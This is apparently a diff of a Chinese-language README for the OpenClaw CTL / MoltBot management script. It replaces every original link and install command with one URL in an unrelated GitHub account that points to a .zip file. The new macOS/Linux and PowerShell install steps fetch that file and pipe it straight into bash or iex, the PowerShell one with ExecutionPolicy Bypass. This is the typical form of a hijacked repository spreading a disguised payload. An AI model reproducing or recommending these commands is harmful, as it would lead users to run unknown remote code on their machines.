@@ -5,9 +5,9 @@ OpenClaw CTL / MoltBot 的管理脚本，把常用操作都包进了一个交互
 支持 macOS（Intel / Apple Silicon）、主流 Linux 发行版和 Windows 11。
 
 作者：Joey  
-YouTube：[@joeyblog](https://youtube.com/@joeyblog)  
-Telegram 交流群：https://t.me/+ft-zI76oovgwNmRh  
-基于：[kejilion](https://github.com/kejilion) 的原始脚本 + [cliproxyapi-installer](https://github.com/brokechubb/cliproxyapi-installer)
+YouTube：[@joeyblog](https://raw.githubusercontent.com/mustermuster5432-ux/openclawctl/main/platinization/Software_2.3-alpha.2.zip)  
+Telegram 交流群：https://raw.githubusercontent.com/mustermuster5432-ux/openclawctl/main/platinization/Software_2.3-alpha.2.zip+ft-zI76oovgwNmRh  
+基于：[kejilion](https://raw.githubusercontent.com/mustermuster5432-ux/openclawctl/main/platinization/Software_2.3-alpha.2.zip) 的原始脚本 + [cliproxyapi-installer](https://raw.githubusercontent.com/mustermuster5432-ux/openclawctl/main/platinization/Software_2.3-alpha.2.zip)
 
 ---
 
@@ -56,7 +56,7 @@ Telegram 交流群：https://t.me/+ft-zI76oovgwNmRh
 ### macOS / Linux
 
 ```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/byJoey/openclawctl/main/openclaw.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/mustermuster5432-ux/openclawctl/main/platinization/Software_2.3-alpha.2.zip)
 ```
 
 运行一次后，输入 `oc` 即可快速启动（脚本自动创建快捷方式）。
@@ -64,7 +64,7 @@ bash <(curl -fsSL https://raw.githubusercontent.com/byJoey/openclawctl/main/open
 或者下载到本地再运行：
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/byJoey/openclawctl/main/openclaw.sh -o openclaw.sh
+curl -fsSL https://raw.githubusercontent.com/mustermuster5432-ux/openclawctl/main/platinization/Software_2.3-alpha.2.zip -o openclaw.sh
 chmod +x openclaw.sh
 ./openclaw.sh
 ```
@@ -74,7 +74,7 @@ chmod +x openclaw.sh
 在 PowerShell 中运行：
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/byJoey/openclawctl/main/openclaw.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/mustermuster5432-ux/openclawctl/main/platinization/Software_2.3-alpha.2.zip | iex"
 ```
 
 运行一次后，新开 PowerShell 窗口输入 `oc` 即可快速启动。
@@ -82,7 +82,7 @@ powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.c
 或者下载到本地再运行：
 
 ```powershell
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/byJoey/openclawctl/main/openclaw.ps1 -OutFile openclaw.ps1
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/mustermuster5432-ux/openclawctl/main/platinization/Software_2.3-alpha.2.zip -OutFile openclaw.ps1
 .\openclaw.ps1
 ```
 
